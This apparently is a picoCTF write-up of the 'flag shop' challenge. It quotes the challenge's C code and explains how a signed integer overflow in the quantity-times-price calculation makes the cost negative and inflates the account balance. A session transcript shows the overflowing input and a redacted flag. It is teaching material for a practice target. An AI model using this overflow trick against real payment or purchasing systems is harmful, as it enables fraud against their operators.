Category: [General Skills](../)

## Description ##
 
There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc jupiter.challenges.picoctf.org 9745

## Thought process ##
The file provided is a c program that appears to be a simple flag exchange simulation.

After inspection of the code we can see that the only way to get the flag is to have a balance exceeding 10000.

We can also spot room for an integer overflow in the following part of the code which would be helpful
```c
.
.
.
  if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
.
.
.
```
The cost of flags is calculated as total_cost = 900 * number_flags, and if you input a very large value for number_flags, it could result in an overflow.

Size of integers is different from one program to another but is always upperbounded. If the result of 900 * number_flags exceeds this maximum value, it will "wrap around" and become a negative number because integers are represented in two's complement form.
Then subtracting this negative total_cost from account_balance would make it a large positive number.

## Solution

We test using different large numbers, until we succesfully cause an overflow:


```bash
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
100000000

The final cost is: -194313216

Your current balance after transaction: 194313416

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: #picoCTF{......}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```
